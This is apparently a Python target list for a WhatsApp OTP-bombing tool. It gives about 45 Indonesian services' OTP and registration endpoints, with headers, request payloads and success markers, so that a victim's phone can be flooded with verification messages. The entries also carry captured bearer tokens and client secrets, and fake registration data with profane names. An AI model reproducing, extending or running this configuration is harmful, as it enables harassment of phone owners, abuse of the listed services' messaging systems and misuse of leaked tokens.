#!/usr/bin/env python3
# targets.py - Daftar target OTP WhatsApp

import uuid
import random

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only

TARGETS = [
    {
        'name': 'HRS-BRE',
        'post_type': 'hrsbre',
        'number_fmt': fmt_08,
        'success_on': ['success', 'berhasil', 'otp', 'verifikasi', 'selamat']
    },
    {
        'name': 'EraFone',
        'post_type': 'erafone',
        'number_fmt': lambda p: p,
        'success_on': ['Success Request OTP']
    },
    {
        'name': 'PlanetBan',
        'post_type': 'planetban',
        'number_fmt': fmt_08,
        'success_on': ['status":true', 'success']
    },
    {
        'name': 'TuneUp',
        'post_type': 'tuneup',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'HashMicro',
        'post_type': 'hashmicro',
        'number_fmt': fmt_phone_only,
        'success_on': ['success', 'thank', 'terimakasih', 'redirect']
    },
    {
        'name': 'Klook',
        'post_type': 'klook',
        'number_fmt': fmt_plus,
        'success_on': ['requestId']
    },
    {
        'name': 'Internet Rakyat',
        'post_type': 'internetrakyat',
        'number_fmt': fmt_08,
        'success_on': ['"statusCode":200']
    },
    {
        'name': 'Ultramilk',
        'post_type': 'ultramilk',
        'number_fmt': lambda p: p,
        'success_on': ['success']
    },
    {
        'name': 'Kaniva',
        'post_type': 'kaniva',
        'number_fmt': fmt_08,
        'success_on': ['"message":"success"']
    },
    {
        'name': 'Jembatani',
        'post_type': 'jembatani',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'RCX',
        'post_type': 'rcx',
        'number_fmt': fmt_08,
        'success_on': ['challenge', 'redirecting']
    },
    {
        'name': 'Sahabat Teknisi',
        'post_type': 'sahabatteknisi',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'Auto2000',
        'post_type': 'auto2000',
        'number_fmt': fmt_08,
        'success_on': ['"acknowledge":1']
    },
    {
        'name': 'Astra Daihatsu',
        'post_type': 'astra_daihatsu',
        'number_fmt': fmt_plus,
        'success_on': ['OTP Success']
    },
    {
        'name': 'Royal Canin',
        'post_type': 'royal_canin',
        'number_fmt': fmt_plus,
        'success_on': ['SUCCESS']
    },
    {
        'name': 'Watsons',
        'post_type': 'watsons',
        'number_fmt': fmt_phone_only,
        'success_on': ['token']
    },
    {
        'name': '99.co',
        'post_type': '99co',
        'number_fmt': fmt_plus,
        'success_on': ['ok']
    },
    {
        'name': 'Beli Rumah',
        'post_type': 'belirumahco',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'otp', 'code']
    },
    {
        'name': 'Fastwork',
        'post_type': 'fastworkid',
        'number_fmt': fmt_08,
        'success_on': ['reference_code']
    },
    {
        'name': 'Beautyhaul',
        'post_type': 'beautyhaul',
        'number_fmt': fmt_phone_only,
        'success_on': []
    },
    {
        'name': 'Hainaya',
        'post_type': 'hainaya',
        'number_fmt': fmt_phone_only,
        'success_on': ['otp', 'success', 'tenant_id', 'session_id']
    },
    {
        'name': 'MinumYukKaka',
        'post_type': 'minumyukkaka',
        'number_fmt': fmt_08,
        'success_on': ['IsSuccess', 'success', 'otp']
    },
    {
        'name': 'SIDEMANG',
        'post_type': 'sidemang',
        'number_fmt': fmt_08,
        'success_on': ['otpDispatched']
    },
    {
        'name': 'LaporMasBup',
        'post_type': 'lapormasbup',
        'number_fmt': fmt_08,
        'success_on': ['berhasil', 'warga_id', 'message']
    },
    {
        'name': 'PTSP Kemenag',
        'post_type': 'ptspkemenag',
        'number_fmt': fmt_08,
        'success_on': ['success', 'user']
    },
    # JSON Handlers
        {
        'name': 'Pinhome',
        'post_type': 'json',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'referer': 'https://www.pinhome.id/daftar',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://www.pinhome.id'
        },
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Maulagi',
        'post_type': 'json',
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'referer': 'https://maulagi.id/daftar',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'X-ML-KEY': 'C05VDYDJ5',
            'Origin': 'https://maulagi.id',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"credentials":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'status']
    },
    {
        'name': 'Rumah123',
        'post_type': 'json',
        'url': 'https://www.rumah123.com/auth/check-phonenumber',
        'referer': 'https://www.rumah123.com/user/login/',
        'headers': {
            'Content-Type': 'application/json',
            'Base-Url-Core': 'https://www.rumah123.com',
            'Origin': 'https://www.rumah123.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone_number":"{number}"}',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'true', 'status']
    },
    {
        'name': 'Paper',
        'post_type': 'json',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'referer': 'https://paper.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://paper.id','x-paper-user-agent':'multiverse/2.54.1 mobile_web (android) chrome'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp']
    },
    {
        'name': 'Dunia Games',
        'post_type': 'json',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'referer': 'https://duniagames.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://duniagames.co.id','x-device':'85d3da46-4d56-4675-90fc-e27926c56de1'},
        'payload': '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp']
    },
    {
        'name': 'MAPCLUB',
        'post_type': 'form',
        'url': 'https://fhapi.mapclub.com/v1/member/signup1',
        'referer': 'https://foodhall.mapclub.com/member1/register',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json',
            'Authorization': 'Bearer 77f5c743c5260054256477ee985b50aa7e614a5ecc53afee0f412fe5617481781788539165',
            'Timestamp': '1788539165'
        },
        'payload': (
            'firstName=anak&'
            'lastName=anjenk&'
            'phone={number}&'
            'email=pokayhub%40gmail.com&'
            'birthDate=2001-09-05&'
            'city=Kota+Lombok+Tengah&'
            'referralCode=&'
            'biz=37&'
            'gender=MALE'
        ),
        'number_fmt': lambda p: p,
    },
    {
        'name': 'Bonus Belanja',
        'post_type': 'json',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'referer': 'https://www.bonusbelanja.com/register/',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bonusbelanja.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone":"{number}","name":"jejep","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p,
        'success_on': ['error":false']
    },
    {
        'name': 'Matahari',
        'post_type': 'json',
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/register',
        'referer': 'https://matahari.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://matahari.com'},
        'payload': '{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success','code','already exists']
    },
    {
        'name': 'Tokopedia OTP',
        'post_type': 'json',
        'url': 'https://gql.tokopedia.com/graphql/OTPRequest',
        'referer': 'https://www.tokopedia.com/register',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Origin': 'https://www.tokopedia.com',
            'x-tkpd-lite-service': 'oauth',
            'x-version': '04f884c',
            'x-tkpd-akamai': 'otp',
            'x-source': 'tokopedia-lite',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '[{"operationName":"OTPRequest","variables":{"msisdn":"{number}","MsisdnEnc":"","EmailEnc":"","otpType":"116","mode":"whatsapp","otpDigit":6},"query":"query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) {\\n  OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\\n    success\\n    message\\n    errorMessage\\n    sse_session_id\\n    list_device_receiver\\n    error_code\\n    message_title\\n    message_sub_title\\n    message_img_link\\n    __typename\\n  }\\n}\\n"}]',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Tiket.com / Blibli',
        'post_type': 'json',
        'url': 'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate',
        'referer': 'https://account.bliblitiket.com/login/complete-details',
        'headers': {
            'Content-Type': 'application/json',
            'X-Request-Id': 'e73793da-ec75-44d5-9cf3-645ad66f3487',
            'X-Channel-Id': 'MWEB',
            'X-Client-Id': '9dc79e3916a042abc86c2aa525bff009',
            'X-Entity': 'TIKET',
            'X-Lang': 'id',
            'Origin': 'https://account.bliblitiket.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"{number}","recaptchaToken":"","challengeToken":"1.B25by72d6UZKYXw0sYpbHWR6yv8vfloujlS-ByjjkDzaLxH9yeE55G8mbnsmlk7desJMTmRMZ2JILlMEbYBGtNC9W9bhzZ5_VHTdn0gPaTWZiNW3unlq1IoTc97aI16vleF47v9A4d0nqmH0TZVnP5VUyNhk1CX3Y6_BH-M5Pwi8DEs_XxcF1Qls9en5QKLCFb9SVD_S3aCkdIQexGVY2I6iYH2qdzpHOtrHtvw8gx6LP3wSu25jEwRtqksK9RINGwX7HfEs0d2Vcus2TGUqzgdnvrPnUGXiAhTqZT40ZZPbXFN30HeqL1MLt_ucXyBafiQUOJpLQ3ZpKJmB2fITtwpB4OQbOGeFpi23U0pvXuesrGaY9OtlRhL7AddzRX3FkHSHTTAIoL98lzgr5R6Z0dEQoSifmD0DWEpGjG5Fy3qLww6Qybj4agZwSKEV4iz6MBjPvzX4_5SrAU5-pL8YPOcE03ZMEm-RClklM6UIBYrVPoZ49pSj6DSmWJLpx-PPUDUpMe4LhndVhUKJC9MgCVQtoDGW8_Z1M5-LxcHjn_9a2vi5Y8t-gafnICiBd9h8FziavtbWiV2vAJG_fM-ShLnIPx6lF_Od5OGeyUb8hc92Bh0nCzLynG54bZi6nBQPSz5K3LD2pZL58ANFPZkFvgTImk_xb99Wab68o4TIIMs.Jbg60RfZesoMSGd16QNlWw.a83f14d399d4070b7b925d7967543e82d8d20ef219e70a9fbd780f2b53074d5d"}',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'true', 'responseCode']
    },
    {
        'name': 'Catato ID',
        'post_type': 'json',
        'url': 'https://catato.id/api/v1/auth/register/start',
        'referer': 'https://catato.id/register',
        'headers': {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://catato.id',
            'X-Request-ID': 'web-a86d2f94-6382-46e0-a0bd-e946794b4e01',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"name":"Anak Kontol","email":"test@gmail.com","phone":"+{number}","password":"Jepin28282811.","password_confirmation":"Jepin28282811.","plan_id":"01ky6hrxbmjmhznyvfj41hbnd3","referral_source":"code"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true', 'data']
    },
    {
        'name': 'ACC OTP',
        'post_type': 'json',
        'url': 'https://www.acc.co.id/register/new-account/pin',
        'referer': 'https://www.acc.co.id/register/new-account/pin',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'text/x-component',
            'Origin': 'https://www.acc.co.id',
            'next-action': '7f8e862fff4b3a97ae5e866780a086283a999e8a7f',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '[{"user_id":null,"action":"register","send_to":"{number}","provider":"whatsapp"}]',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true', 'data']
    },
        {
        'name': 'Brighty Official',
        'post_type': 'get',
        'url': 'http://membership.brightyofficial.com/send_otp?phone={number}',
        'referer': 'http://membership.brightyofficial.com/',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        },
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'KapanLagi',
        'post_type': 'json',
        'url': 'https://www.kapanlagi.com/api/v2/auth/otp/request',
        'referer': 'https://www.kapanlagi.com/',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://www.kapanlagi.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Vidio',
        'post_type': 'json',
        'url': 'https://www.vidio.com/api/v1/users/send_otp',
        'referer': 'https://www.vidio.com/',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.vidio.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone_number":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Sociolla',
        'post_type': 'json',
        'url': 'https://login.soco.id/api/otp/request',
        'referer': 'https://login.soco.id/?callback_url=https%3A%2F%2Fwww.sociolla.com%2Fpromo%3Fnormal_login%3Dtrue',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Authorization': 'Bearer b9409c537766cc25cd378625ad7ee830e6dac38b603a019289f8741c19cf5046',
            'SOC-PLATFORM': 'sociolla-web-mobile',
            'session_id': '7a2347d8-ae83-428c-90d1-dfd61b9cbb33',
            'Origin': 'https://login.soco.id',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"method":"whatsapp"}',
        'number_fmt': fmt_nocode,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Cermati',
        'post_type': 'json',
        'url': 'https://edge.cermati.com/rest/auth/register-v4',
        'referer': 'https://www.cermati.com/app/gabung',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://www.cermati.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"mobilePhone":"{number}"}', # Sesuaikan key payload dengan parameter aslinya
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Optik Melawai',
        'post_type': 'json',
        'url': 'https://api.optikmelawai.com/api/v2/auth/register/verify/phone/request',
        'referer': 'https://www.optikmelawai.com/register',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Authorization': 'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
            'Language': 'id',
            'X-Unique-User': 'GA1.1.699024125.1788538087',
            'Origin': 'https://www.optikmelawai.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"value":"{number}","provider":"mobile_number"}',
        'number_fmt': fmt_nocode,
        'success_on': ['success', 'true', 'message']
    },
    {
        'name': 'Ralali',
        'post_type': 'json',
        'url': 'https://access.ralali.com/sso/v1/register',
        'referer': 'https://www.ralali.com/signup',
        'headers': {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Lang': 'id',
            'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOjEwMDAwLCJ0b2tlbl92ZXJzaW9uIjoiMS4wLjAiLCJ0b2tlbl90eXBlIjoiZ3Vlc3RfdG9rZW4iLCJhdWQiOiIxMSIsImV4cCI6MTc4ODU4NjA3OSwianRpIjoiZGZmMmI3MTQtYzZjYS1jNGQ0LWQwMjMtMzM5ZmJiZjc2ZDljIiwiaWF0IjoxNzg4NDk5Njc5LCJpc3MiOiIvZXgvdjEvYXV0aG9yaXplIn0.SY21CLTKGLsvEG0OOBQz-pWsxIolo5ZL6qNA0aIkWmqman4g3A2LJ_Z9gFGYpVmFfEvanuU_8G0UL8MeYQv6BSL3ZQJ3EWYk6Ju3gzU_Z0GQVBvBzZWHxxzm3dbTS2_W4QoLCaU_8SawGPIQPf79aPm985JkiPy0ZvIihhxQgfGDjz5jAtKLuU2_3JHw0kzK1mRnajm1NiBypws946Vz_13GbKkU9lB5RDOJj3KsrPGrvgtuR4erXMoKAWGrSe2jTAPnx3B8LkBGW4s_YFa-Go6UGHxVxph2_URPwi3FSs62dCpDhh3_l2hI-5dyEJrODvd0-gLtaISBJ61fuas8ew',
            'Origin': 'https://www.ralali.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"sso_code":"sso-ralali-group","otp_channel":"whatsapp","validate_by":"{number}","name":"jepink gantenk"}',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'true']
    },
]
